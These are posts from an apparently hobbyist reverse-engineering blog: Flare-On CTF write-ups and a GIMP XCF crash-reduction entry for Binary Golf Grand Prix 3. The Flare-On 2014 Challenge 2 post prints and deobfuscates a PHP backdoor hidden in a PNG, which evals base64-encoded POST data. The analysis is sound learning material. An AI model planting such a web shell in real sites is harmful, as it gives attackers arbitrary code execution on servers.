title: Binary Golf Grand Prix 3
snippet: IntroductionThis is the quick write-up for my BGGP #3 submission. I’m keeping this rather brief compared to my usual write-ups asI’m in the middle of multiple activities at my day job which have been keeping me rather occupied.The challenge description and rules can be found at https://tmpout.sh/bggp/3/.ObjectivesThe primary objective, is to find the smallest file that can crash a software. There are other rules as well that’sstated in the link above. Other notable objectives that should be mentioned is to manipulate/control the crash andhijack the execution, and print/return 3.Target & environmentThe target is GIMP 2.10.30. I didn’t have the time to figure out how to fuzz. So I went with one of the recommendationslisted in the challenge, that is to browse for CVEs. I took the easy way out by listing the CVEs in descending dateorder, searched for “crash”, and went through each one to search for those that comes with a sample file. And that’show I ended up with this target.https://gitlab.gnome.org/GNOME/gimp/-/issues/8120The CVE details showed that the crash happened in Linux, but it’s reproducable in Windows, which is the environment I’musing. The bug is already fixed in the current release of GIMP, so I know I won’t be getting the bonus points forauthoring the patch.Tools Disassembler - IDA Free 7.7 (reverse engineering is a hobby, so I can’t convince myself to buy the Pro or Home version). Debugger - x64dbgThe source code for GIMP is also available at https://gitlab.gnome.org/GNOME/gimp/-/tree/gimp-2.10, which I use as a reference to compare against the disassembly.CrashAfter some debugging, I determined that the crash is due to a flaw in how GIMP parses malformed PROP_PATHS in the XCFformat. When PROP_PATHS is shortened, the XCF parser still reads the subsequent values without checking for validity.Hence comes to a point where it reads the bad ‘number of points’ value from the malformed PROP_PATHS. The following value after ‘number of points’ is a version number. If the version number is 1, GIMP tries to allocate memory accordingto ‘number of points’. With the sample POC crash file, the output is as follows.PS C:\projects\bggp3> &'C:\Program Files\GIMP 2\bin\gimp-console-2.10.exe' '.\poc for gimp_original'Unknown path type. Possibly corrupt XCF fileC:\Program Files\GIMP 2\bin\gimp-console-2.10.exe: Gimp-XCF-WARNING: Maximum string length (16777216 bytes) exceeded. Possibly corrupt XCF file.Unknown path type. Possibly corrupt XCF fileC:\Program Files\GIMP 2\bin\gimp-console-2.10.exe: Gimp-XCF-WARNING: Maximum string length (16777216 bytes) exceeded. Possibly corrupt XCF file.(gimp-console-2.10.exe:10544): GLib-ERROR **: 23:02:28.111: ../glib-2.70.2/glib/gmem.c:142: failed to allocate 46068228096 bytesC:\Program Files\GIMP 2\bin\gimp-console-2.10.exe: fatal error: unhandled exceptionGimp-Core-CRITICAL (recursed) **: gimp_item_get_ID: assertion 'GIMP_IS_ITEM (item)' failedReducingThe original file size in the CVE crash is 644 bytes. Since I understood how the crash happened, I could reduce the sizeby removing all the bytes that came after the version number. The POC crash file had 16 paths, and GIMP crashed afterreading the 3rd path. I could shorten this further to reduce the path quantity to 1. In the end, the smallest fileachieved is 67 bytes.BonusThere are bonus points for the challenge if we can hijack the execution and manipulate the output after hijacking.Unfortunately, I couldn’t find any way to hijack the execution for this crash. I have never written any exploits before,although I know the theory behind it. But after some quick research I concluded that there’s no way to hijack theexecution of this crash (I may be wrong since I’m no expert in this).Instead of hijacking, I tried to manipulate the output in a slightly different way. This probably won’t earn me anybonus points, but I thought it’ll be interesting to try anyway.Knowing that GIMP’s error output mentions number of bytes that it was trying to allocate, I tried to manipulate thisinstead by crafting the ‘number of points’ into the crash file. But the size per point is 0x18 bytes, so it’s not possible to get a perfect string of 3’s. Hence the closest I could get is the following.PS C:\projects\bggp3> &'C:\Program Files\GIMP 2\bin\gimp-console-2.10.exe' .\bggp3crash(gimp-console-2.10.exe:10772): GLib-ERROR **: 17:28:20.655: ../glib-2.70.2/glib/gmem.c:142: failed to allocate 33333333336 bytesC:\Program Files\GIMP 2\bin\gimp-console-2.10.exe: fatal error: unhandled exceptionGimp-Core-CRITICAL (recursed) **: gimp_item_get_ID: assertion 'GIMP_IS_ITEM (item)' failedOutroThis will be my first (maybe last) submission for BGGP3. If I have time I’ll try to learn fuzzing and pick up a newtarget in which the execution can be hijacked.

title: Flare-On 2014 Challenge 2
snippet: IntroductionFinally, the write-ups for all Challenge #1 across all Flare-on events to dateare completed. As we move on to Challenge #2 series, the writeups will be lessnewbie-ish.This challenge consists of a HTML file home.html and an image flare-on.png.EnvironmentOnly a browser is sufficient. The newer Microsoft Edge is used here, which isbased on Chromium. When opening the file home.html, we’re greeted with thefollowing page.ReversingIt’s quite interesting to see that the page does not have anything that asks forinputs or indicate where to begin looking for the flag. So the next natural stepis to look at the HTML source code.Nothing seem to strike as odd… until line 152.Why is an image file being referenced from inside a PHP tag??It’s time to take a closer look at this image file.By inspecting flare-on.png in a hex or text editor, some PHP code can be foundembedded at the end of the image file.Here’s the reformatted code (and shortened, to save space):$terms=array("M", "Z", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", ...);$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, ...);$do_me="";for($i=0;$i<count($order);$i++){ $do_me=$do_me.$terms[$order[$i]];}eval($do_me);This code obfuscation snippet takes elements of $terms to build the string$do_me using the arrangement in $order. The string $do_me is executed atthe end (or at least, it tries to execute… see Bonus section). Let’s see what$do_me turns out to be.I used Python to replicate the code and obtained the following output (alsoreformatted and shortend).$_= 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0Xg...';$__='JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";eval($___($__));More code obfuscation. New variables $_, $__ and $___ are defined. Itappears that $___ is a function, using $__ as the argument. The functionname is defined using numbers in base 8 (octal) and 16 (hexadecimal). This istranslated to base64_decode. So essentially, the above code is decoding $__using Base64, which turns out to be:$code=base64_decode($_);eval($code)Now, $_ is decoded using Base64 too, then the result is executed. The decodedterm is as follows:if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97..."])) { eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44..."]));}The string within the $_POST is interesting. The values are notated ashexadecimal and decimal numbers, which translates toa11DOTthatDOTjava5crapATflareDASHonDOTcom, or the flaga11.that.java5crap@flare-on.com.ExtrasTrying the challengeThe deobfuscated PHP code embedded in the PNG file is attempting to read thePOST value of the HTML variable a11DOTthatDOTjava5crapATflareDASHonDOTcom,then executes the Base64-decoded value of the variable. In theory, this codeis a backdoor to execute any arbitrary PHP code that is Base64-encoded.Out of curiosity, I tried to put this theory to the test and see if it works.Hence, I set up a simple Apache server with PHP module, and configured thesetup accordingly. Unfortunately, it didn’t work. Because the variable $do_mecontains slashes which was read as an unexpected token by PHP.However, this actually served as an unexpected shortcut to find out the flag.Since the code is reading the $_POST variables which didn’t exist in my tests,the follow error was found in the Apache logs and the flag is visible.CodeThe Python code used for this challenge can be viewed in Github.

title: Flare-On 2021 Challenge 1
snippet: IntroductionThe challenge is called credchecker and consists of a HTML file admin.htmlwith some images. This challenge is special to me as it’s the first officialFlare-On challenge that I joined, and managed to complete.EnvironmentOnly a browser is sufficient. The newer Microsoft Edge is used here, which isbased on Chromium. When opening the file admin.html, we’re greeted with thefollowing page.ReversingThe page requires 2 inputs: a username and a password. Using the browser’sdeveloper mode, or viewing the source code, what we need to find is the HTMLform that takes the 2 inputs. We observe that the Check Credentials button is grayed out, until both username and password have at least 1 character.The HTML form can be found in line 94, with the ID credform. It isencapsulated by a <div> tag bearing the ID formdiv.The button Check Credentials has an onclick event that calls theJavascript function checkCreds(). Let’s take a look at this function that is defined on line 132.The function performs some very simple checks. Username should equal “Admin”. Password after using atob() function should equal “goldenticket”. The Javascript atob() function stands for ASCII-to-binary, which is a base64 decoder.So the expected password would be the base64-encoded version of “goldenticket”.There are many ways to do so. Without overcomplicating too much, the moststraightforward way is to use Javascript’s btoa() function within thebrowser’s developer mode.btoa("goldenticket")And we get the result Z29sZGVudGlja2V0. By supplying this as the password, weget the following screen, with the flag enter_the_funhouse@flare-on.com.

title: Flare-On 2020 Challenge 1
snippet: IntroductionThe challenge file fidler.exe is a Python application. This challenge is rather unique as the Python source code is also provided with the challenge. Thechallenge message simply states that we should win the game by any meansnecessary to get the flag.EnvironmentOf course, Python need to be installed. I installed Python 3.10.2 on Windows 11.The following image shows the first screen upon running the challenge.ReversingStage 1In the prompted screen, we can see only a single text input asking for apassword. So, let’s see how this password is validated. Since the source codefidler.py is provided, we can immediately start to look at its contents. Veryquickly the function password_check can be found.This function is very straightforward. Simply taking every character of thestring hiptu and subtracting 1. The result compared to an input string. Witha Python console, this is trivial to replicate to obtain the Stage 1 keyghost.altered_key = 'hiptu'key = ''.join([chr(ord(x) - 1) for x in altered_key])print(key)Stage 2In the next stage, we see the following window.The easy way, albeit slow, is to follow the instructions and earn 100 billioncoins by clicking on the cat, purchasing the autoclicker and increasing the rateof coins earned till the goal is achieved.Eventually, the flag idle_with_kitty@flare-on.com is shown.BonusThis is a reversing challenge, so why should we settle for the final flag justlike that? :) Let’s try to understand what’s happening behind the scenes ofStage 2.By browsing the source Python source code again, it’s easy to spot the check forcoins on line 147.The game checks if the current coins available is (2**36) + (2**35), whichturns out to be 103079215104. This number is divided by 10**8, ending up with1030 after taking only the integer portion of the result. This number is usedas an argument to the function call victory_screen. The ** in Python means power of. I.e. 2**36 is $$ 2^36.In function victory_screen, the argument variable name is token, and issubsequently used by the function decode_flag.Replicating this function in Python and using the token value 1030 returns thesame flag.

title: Flare-On 2019 Challenge 1
snippet: IntroductionThe challenge file MemeCatBattleStation.exe is a .NET application. This factis stated in the challenge message, and even suggested to use dnSpy. But we’llbe using dnSpyEx instead to decompile the binary.EnvironmentI just started trying Windows 11. Quite surprisingly, the challenge EXE didn’tprompt to install .NET framework.ReversingThe initial window of the challenge have 2 key features: the text box and aa button with the label ‘Fire!’. We know from the challenge message that we aresupposed to find out the ‘weapons codes’. So the immediate task is to find theform that displays this window, and the procedures that runs after the ‘Fire!’button is clicked.Using dnSpyEx, the form Stage1Form can be found very easily. Within the form,the procedure FireButton_Click() is the obvious suspect to look into. And within that procedure, it’s clear that the inputs of the codeTextBox iscompared to the string RAINBOW. By using this string as the input, the nextstage form is visible.The next stage form is pretty similar to the first one. From the dnSpyEx’sdecompiler output, the Stage2Form is a bit more complicated than the previousform. The procedure FireButton_Click() calls the function isValidWeaponCodeto validate the input weapon code. In isValidWeaponCode, the function takeseach character of the input, XORs with char A, then compares the result toa sequence of arrays.To find out the valid input string for this form, we only need to reverse theprocedure. That is, to XOR the sequence of arrays with A. Below is theprocedure in Python.bytes = "\x03 &$-\x1e\x02 //./"o = ""for c in bytes: o += chr(ord(c) ^ ord('A'))print(o)The code above gives the output Bagel_Cannon. After entering this string intothe form, a new screen is shown with the flag Kitteh_save_galixy@flare-on.com.

title: Flare-On 2018 Challenge 1
snippet: IntroductionFollowing the same writing style as Flare-On 2014 Challenge 1, inwhich I will attempt to explain my thought process in tackling this challenge.With this, I hope this will benefit absolute beginners to reverse engineering.ReconThe challenge is a JAR file MinesweeperChampionshipRegistration.jar, which isa Java Archive file. In that case, we can use a Java decompiler, such asJADX.EnvironmentSince it is a Java challenge, then of course, a Java Runtime Environment isneeded. The JAR file can be executed with the command java -jar ./MinesweeperChampionshipRegistration.jar. This gives the followingwindow:ReversingThis is a very trivial exercise. As soon as the JAR file is loaded into JADX,the flag GoldenTicket2018@flare-on.com would be staring at our face already.After putting this flag in the input window, we get the ‘success’ screen.

title: Flare-On 2017 Challenge 1
snippet: IntroductionFollowing the same writing style as Flare-On 2014 Challenge 1, inwhich I will attempt to explain my thought process in tackling this challenge.With this, I hope this will benefit absolute beginners to reverse engineering.ReconThe challenge is a single file login.html, containing a text box for enteringthe flag, and a button that triggers checking of the flag.By viewing the source code, we can see: The text input with ID flag The button input with ID promptEnvironmentNo special environment needed. Any Chromium-based web browser with the built-indev tools will do.ReversingWithin the <script> tag, we can see the following actions being done: Upon clicking on button prompt, perform the following steps. Get value of flag. Performs a function that uses flag, storing the result into rotFlag. Compares rotFlag to the value PyvragFvqrYbtvafNerRnfl@syner-ba.pbz. Triggers alert Correct flag! if equal, else trigger Incorrect flag, rot again.The function at Step 3 is of interest.rotFlagHere’s the function after a simple reformatting exercise.var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){ return String.fromCharCode( (c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26); });It will be the reader’s exercise to understand the code in detail. Basicallythis is taking every alphabet in the input string and add value 13. Effectivelyperforming a very basic string encryption called ROT13. We can useCyberchef to perform the ROT13 algorithm on the value beingcompared to, and get the flag ClientSideLoginsAreEasy@flare-on.com.ExtrasCoding practiceGithub repo containing Python3-based ROT13 decoder. From searchingaround, it seems that the easiest way to implement the ROT13 is by usingPython’s string translation. Quite unlike the challenge’s method of adding 13to the char value.

title: Flare-On 2016 Challenge 1
snippet: IntroductionFollowing the same writing style as Flare-On 2014 Challenge 1, inwhich I will attempt to explain my thought process in tackling this challenge.With this, I hope this will benefit absolute beginners to reverse engineering.So far, this is the harder Level 1 challenge compared to the previous ones. So this write-up will be longer than usual.ReconJust like Flare-On 2015 Challenge 1, Detect-It-Easy (DIE) showsthat this is a PE32 console compiled using Microsoft Visual C/C++. In this case,I choose to use IDA Freeware and Ghidra to disassemble thebinary. Being a hobbyist reverse engineer, I’m a bit unwilling to buy an IDA Prolicense. So a combination of IDA Freeware + Ghidra works best for me due tofamiliarity of using IDA’s UI, pretty good signature library from Ghidra, and the amazing decompiler from Ghidra.There are also a few interesting-looking strings that gives a clue on where tostart digging from:Offset (hex):	String0000bf98:	Enter password:0000bfac:	Correct!0000bfb8:	Wrong passwordEnvironmentJust like the previous year’s Challenge 1, I can run the EXE on my Windows 10VM, and getting that prompt asking for the password.The approach I took is the same as the previous year’s Challenge 1 too. But thistime I utilized Ghidra for the signature library and decompiler.ReversingFollowing the same flow as the previous challenge, we would want to find answersto these questions: Where is our input is read? How is the input used to decide ‘Correct’ or ‘Wrong’?We begin by loading the EXE into IDA, and we get to a screen with a graph and ASM code.We can see a stark difference compared to the previous year’s Challenge 1. Atfirst glance, the disassembly doesn’t seem to make any sense. This is due to thecompiler being used. What we’re seeing here is a compiler stub inserted to the binary prior to executing int main().We could try to follow this code flow, and eventually end up at the code thatprints “Enter password:”. But this is relatively more time consuming. So let’stry a quicker method to get to the code that reads the input.Find the codeThe first thing we need to do is find where in the EXE it prints the string “Enter password:” and read our input. There are 2 common approaches of doingthis: Find the string ‘Enter password:’, then investigate the cross-references (or Xref for short) to this string. Find the API that print strings to console, then investigate the Xrefs toit.Since this write-up is meant for absolute beginners, I will try to explain bothmethods.Method 1: Find the stringWe know that the EXE prints “Enter password:”, then wait for our prompt. And wealso know from the recon session that this string is found at offset 0000bf98.However, this offset refers to the physical location of the string in the EXEfile. In IDA (and all other disassemblers/debuggers), the virtual address (VA)is used.So let’s find the VA of the string. First, bring up the Strings subview (Shift-F12) in IDA and find the string “Enter password:”.We can see that the string is located at 40d198. Double-click or press Enteron the string will bring you to the disassembly window where the string is.IDA has automatically named the string with the label aEnterPassword. IDA alsoshows the one-and-only Xref to this string, which is at sub_401420+2E. We candouble-click (or press Enter) and we’ll get to the disassembly where this stringis used.And here we can see the familiar procedure of using WriteFile to print theprompt, and ReadFile to get the password input. This is where we should beginour code analysis.Method 2: Find the APIFrom Flare-On 2015 Challenge 1, we have seen that we can use WriteFile to print text to console. This is what we will use to find the code for analysis.In IDA, use the Imports subview and find the API WriteFile. Similar to theprevious method, double-click/Enter on the API to view the disassembly wherereferences to WriteFile can be found.In this case, we can see there are more than 1 reference to WriteFile. Whichmakes sense because WriteFile is also used to print the success/error messagetoo. If you put the cursor over the WriteFile text and press X (or right-clickthen choose Jump to xref to operand), we get a table where this API isreferenced from.It’s a bit painful, but the supposed next step is to click on each Xref one-by-one, quickly evaluate the code, and decide if the code is what we’re looking for. Thankfully, the first few Xrefs is what we need.AnalysisThe procedure here is very similar to Flare-On 2015 Challenge 1, with someslight differences.Now, this is where Ghidra shines over IDA Freeware. We could repeat the methodsmentioned above in Ghidra and arrive at the same location in the EXE. But nowwe can see the decompiled C code. And as a bonus, function sub_402C30 seen inIDA is identified as _strcmp in Ghidra. TIP: Try renaming sub_402C30 in IDA to _strcmp (with the underscore).From this, we can see that the EXE performs these steps: Takes the input Pass the input to sub_401260 Compare its output to “x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q”So the function that we need to understand is at sub_401260.Understanding sub_401260With experience, one could tell that the string being compared to looks like abase64 encoded string. We can test that theory quite easily, by usingCyberchef and the function “From Base64”. It’s a good idea to try understand how Base64 encoding/decoding algorithm works.Oops, the output looks like gibberish. Not quite what we expected. So now weshould investigate sub_401260 more deeply.By going into the function’s disassembly, a quick glance around the functionshows a few references to the string “ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/”being used as a lookup. If you already know how Base64 works, the lookup stringthat’s normally used is different. In other words, this Base64 algorithm ismodified.Thankfully, Cyberchef have the feature to change the lookup string.And by doing so, we get the flag sh00ting_phish_in_a_barrel@flare-on.com.ExtrasCoding practiceGithub repo containing Python3-based solutions. c01.py - Decode the encoded string. c01_qiling.py - Qiling script. Derives the flag on the fly and pass into hooked ReadFile to get the ‘Correct!’ string printed to console.Finding main()The stub inserted by the compiler sort-of prepares the EXE before it reaches thevery important int main(), which is the starting function for any C/C++program. If we refer to this link, the full, Microsoft-specificdefinition of main for a console app is:int main(int argc, char* argv[], char* envp[]);int wmain(int argc, wchar_t* argv[], wchar_t* envp[]);In IDA, we can set the rename sub_401420 to main, and set the functiondefinition following the example above (ensure cursor is in the function, anduse keyboard shortcut Y).We can see how main is called. Put the cursor on the function name, view theXref (shorcut key X), and navigate to the only Xref available there, which isstart-82. Microsoft typically uses the cdecl calling convention, which meansthat the function arguments are pushed into the stack in reverse order. Hencewe can observe in the disassembly the argument envp is pushed first, followedby argv, then argc, before main is called.

title: Flare-On 2015 Challenge 1
snippet: IntroductionFollowing the same writing style as Flare-On 2014 Challenge 1, inwhich I will attempt to explain my thought process in tackling this challenge.With this, I hope this will benefit absolute beginners to reverse engineering.ReconDetect-It-Easy (DIE) shows that this is a PE32 console application.Unlike Flare-On 2014 Challenge 1, DIE doesn’t give any hints of what type ofcompiler is used. So we can most likely use any favourite x86 disassembler.There are also a few interesting-looking strings that gives a clue on where tostart digging from:Offset (hex):	String00000508:	Enter the password>0000051c:	You are success0000052e:	You are failureEnvironmentPretty straightforward so far. I’m able to run the EXE on my Windows 10 VM. Ifwe run the EXE, we get that prompt asking for the password. By entering some random text we get the error message.There are multiple approaches to begin reversing this. The obvious ones are: Find the password prompt, then trace from there to see how the ‘success’ message can be triggerred. Find the ‘success’ message, then back track from there.For this, we can use a x86 disassembler. There are multiple choices availablethat works on multiple platforms (still actively developed at time of writing) Open source: Ghidra radare2 Freeware: IDA Freeware JEB Community Edition Paid: IDA Pro - the most popular disassembler in the industry Binary Ninja JEB Pro Being a hobbyist reverse engineer, I can’t afford to pay for any of the Prodisassemblers. My personal favourite is IDA Freeware. So let’s start with thisfirst, and I may cover other disassemblers using this challenge in the future.ReversingLoad the EXE into IDA, using all the default values and clicking on OK on allprompts. Eventually we’ll get to a screen with a graph and ASM code.At a glance, this is very straightforward. If you’re totally new to this, Istrongly suggest to stop here, get an x86 ASM reference, learn Windows APIs,then come back to this. Learning from FASM is a good start.Basically, the graph can be summarised as:Prompt password using WriteFileGet input password using ReadFileXOR each password byte with 7DhCheck if length is 18hCompare result to byte array at byte_402140If equal: Print successElse: Print failureWe can deduce that the flag should be related to the byte array located atbyte_402140, which is 18h or 24 bytes long.To decode the byte array, we should XOR each byte with 0x7D (the ‘key’). For the absolute beginner, XOR-ing a byte with the same value twice will getback the originalHow to XOR? There are many ways. Use Windows calculator (I’m just trolling, but yeah, it is a valid optionto calculate the XOR result byte-by-byte) Write a program/script.I have an example Python and IDC script in Github. Use Cyberchef The flag is bunny_sl0pe@flare-on.com.ExtrasQilingI’ve been experimenting with Qiling Framework to emulate the binaryand perform the following actions: Hook the ReadFile API call Read the encoded bytes from byte_402140 XOR the encoded bytes with 0x7D Write the results into the buffer specified by ReadFile.The Qiling code can also be found in my Github.

title: Flare-On 2014 Challenge 1
snippet: IntroductionI suppose that if someone is reading this in detail, the reader might be a totalbeginner. So I’ll try to be as comprehensive as possible to explain my thoughtprocess - which I think is more important than the solution itself. It may notbe perfect or the fastest, but that just shows how one can be creative insolving reversing challenges.ReconMy typical first step before starting any reverse engineering task, is to findout more about the binary before dissecting it. I like to use Detect-It-Easy (DIE) to get some basic information of the binary first. With it, we cantell that the binary is a PE32 .NET executable.Knowing this, we can immediately form in our mind what sort of tools we’ll need.My personal favourite tool for .NET reversing is dnSpy since it canfunction as a decompiler and a debugger for .NET binaries. 2021-10-25: I recently discovered dnSpyEx, which is a fork of theoriginal dnSpy that was archived by the original author.Typically, I would also look at strings found in the binary, though normallythis doesn’t do much in harder challenges. But a good habit nevertheles. DIE hasa string feature that’s useful for that, and we can find interesting stringssuch as:Offset (hex):	String00000906:	dat_secret0001c298:	btnDecode_Click0001c3d1:	get_dat_secret0001c406:	dat_secret0001ca5e:	btnDecode0001ca72:	DECODE!0001cb60:	dat_secretI would normally run a Signature check as well. But that doesn’t show anythinguseful in this case.EnvironmentSince I attempted a 2014 challenge in 2021, I imagine that the environment makesa huge difference. The initial challenge was, of course, to make the binariesrun properly in my virtual machine that’s based on Windows 10.Upon running the EXE, Windows prompted to download and install .NET Framework3.5. Thankfully, the EXE ran successfully to get this screen. Trivia: This is an image of the late Bob Ross with his painting. There is atextual description of the picture if one looked close enough at the strings extracted from the EXE.Clicking on the “DECODE!” button changes the screen that shows some gibberish atthe top, and swaps Bob’s face with a dog.ReversingI made the assumption that the gibberish text needs to be decoded. So we beginby figuring out what happens when the button “DECODE!” is clicked.After loading the EXE in dnSpy and exploring the decompiled output, the methodForm1.btnDecode_Click() can be found easily. We can then place a breakpoint atthe start of the method and begin tracing the code. The following actions can beobserved: Load Resources.dat_secret to byte[] dat_secret. Perform an algorithm to each byte of dat_secret, and append to variable text. Terminate text with \0, or null terminator.The final value of text is 3rmahg3rd.b0b.d0ge@flare-on.com, which is the flag for Challenge 1.ExtrasDisplaying the flagFurther studying of the code after the forming textThis isn’t strictly necessary, but if we wanted the EXE to display the flag onthe final screen, the obvious way is to patch the binary to display text instead of text3 as what’s being done in btnDecode_Click(). This can be doneeasily using dnSpy.Coding practiceAs a form of coding practice, we could also try to implement the algorithm inany chosen language. Resources.dat_secret can be saved to disk from dnSpy,identified as rev_challenge_1.dat_secret.encode.# Written with Python 3.10.0with open('rev_challenge_1.dat_secret.encode','rb') as file: text = '' for b in file.read(): text += chr((b >> 4 | b << 4 & 240) ^ 41) print(text)View code in Github

title: Flare-On Challenges
snippet: Flare-On is a CTF1-style reverse engineering challenge. This havebeen held annually since 2014, though I only discovered it this year. There aremultiple levels, each one harder than the next. Solving the challenges requirea wide knowledge across multiple disciplines. And there is typically more thanone way to solve the challenges, depending on one’s creativity.This post aims to be an index page to my (sub-par) solutions for the completed Flare-on challenges. The binaries to the challenges can be downloaded from theirwebsite. Year C01 C02 C03 C04 C05 C06 C07 C08 C09 C10 C11 2014 1                     2015 1                     2016 1                     2017 1                     2018 1                     2019 1                     2020 1                     2021 1                     Capture The Flag ↩

title: Welcome!
snippet: My first post!Nothing much to say. I started this blog because recently Fliermate introduced Flare-on reverse engineering challenges to me. I have not done any reverse engineering for more than a decade, so I thoughtI’d try the previous challenges, take this year’s challenge, and just see how far I could go. Hopefully the write ups here could benefit other reverse engineer hobbyists like me.Anyway, I’m happy to say that I managed to complete the 2021 challenge, with some help from a good friend whom I’ve didn’t keep in touch for any years till the Flare-on 2021 challenge happened.My next few posts will probably revolve around the Flare-on challenges, withmaybe some unrelated stuff in between. I’m still playing around with Githubpages and Jekyll in the meantime.
